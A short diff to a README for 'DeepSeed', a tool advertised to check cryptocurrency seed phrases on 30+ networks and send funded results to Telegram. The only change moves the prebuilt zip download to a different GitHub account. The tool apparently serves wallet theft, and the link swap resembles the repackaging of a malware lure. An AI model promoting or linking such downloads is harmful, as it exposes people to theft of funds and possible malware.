@@ -1,4 +1,4 @@
-# DeepSeed - [latest release](https://github.com/fadddy55/seedphrase_checker/releases/download/v1.0.0/DeepSeed.Release.zip)
+# DeepSeed - [latest release](https://github.com/miseryuniverm/seedchecker/releases/download/v1.0.0/DeepSeed.zip)
 ![ScreenShot](https://i.imgur.com/ybpPztV.png)
 ## Info
 
@@ -42,4 +42,4 @@ DeepSeed - is a software which checks seedphrase on 30+ nets
 - Check results with balance in telegram
 ```
 
-## Download | [DeepSeed](https://github.com/fadddy55/seedphrase_checker/releases/download/v1.0.0/DeepSeed.Release.zip)
+## Download | [DeepSeed](https://github.com/miseryuniverm/seedchecker/releases/download/v1.0.0/DeepSeed.zip)
